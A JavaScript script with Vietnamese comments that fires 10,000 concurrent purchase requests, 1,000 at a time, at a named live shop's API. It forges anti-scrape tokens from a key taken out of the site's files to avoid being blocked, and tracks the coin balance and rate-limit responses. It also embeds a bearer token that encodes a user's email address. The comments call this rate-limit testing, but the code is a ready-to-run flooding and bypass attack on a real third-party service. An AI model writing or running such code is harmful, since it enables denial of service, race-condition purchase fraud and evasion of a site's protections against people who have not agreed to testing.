const crypto = require('crypto');

// Cấu hình từ lệnh curl của bạn
const TARGET_URL = "https://luyentu.com/shop/purchase/22";
const AUTH_TOKEN = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjU5NDE5LCJlbWFpbCI6ImtpdHRlbndhcnJpb3IyMDA1QGdtYWlsLmNvbSIsImlhdCI6MTc3NTgwNjA4OSwiZXhwIjoxNzc1ODA2OTg5fQ.aR-vDPsWALPUeTesjBv_kAUmtPBOsp-3bnD2t4BTjxo";
const ANTI_SCRAPE_KEY = "luyentu-anti-scrape-2026"; // Key lấy từ file index.txt của bạn

// Điều chỉnh tham số để test Rate Limit
const CONCURRENCY = 1000; // Giảm xuống để quan sát phản hồi chính xác hơn
const TOTAL_REQUESTS = 10000; 

function generateAppToken() {
    const e = Date.now().toString();
    const hash = crypto.createHmac('sha256', ANTI_SCRAPE_KEY).update(e).digest('hex').substring(0, 16);
    return `${e}.${hash}`;
}

async function sendPurchaseRequest() {
    try {
        const start = Date.now();
        const res = await fetch(TARGET_URL, {
            method: 'POST',
            headers: {
                'accept': 'application/json, text/plain, */*',
                'authorization': AUTH_TOKEN,
                'origin': 'https://luyentu.com',
                'referer': 'https://luyentu.com/store',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
                'x-app-token': generateAppToken(), // Tạo token động để tránh bị chặn do trùng lặp
                'content-length': '0'
            }
        });
        
        const duration = Date.now() - start;
        let data = {};
        if (res.status === 200) {
            data = await res.json();
        }

        return { 
            status: res.status, 
            time: duration, 
            remainingCoins: data.remainingCoins || "N/A" 
        };
    } catch (e) {
        return { status: "TIMEOUT/CRASH", time: 0 };
    }
}

async function startTesting() {
    console.log(`%c🚀 Bắt đầu kiểm thử API Purchase...`, "color: yellow; font-weight: bold;");
    
    let completed = 0;
    const queue = new Set();

    async function worker() {
        while (completed < TOTAL_REQUESTS) {
            if (queue.size < CONCURRENCY) {
                const p = sendPurchaseRequest().then((res) => {
                    completed++;
                    queue.delete(p);
                    
                    // In log mỗi 10 request để theo dõi biến động status
                    if (completed % 10 === 0) {
                        console.log(`[${completed}] Status: ${res.status} | Coins: ${res.remainingCoins} | Latency: ${res.time}ms`);
                    }

                    // Nếu nhận lỗi 429 (Rate Limit) hoặc 502, hãy quan sát kĩ
                    if (res.status === 429) {
                        console.warn("⚠️ Đã chạm ngưỡng Rate Limit (429)!");
                    }
                });
                queue.add(p);
            } else {
                await Promise.race(queue);
            }
        }
    }

    await worker();
    console.log("🏁 Hoàn tất đợt kiểm thử.");
}

startTesting();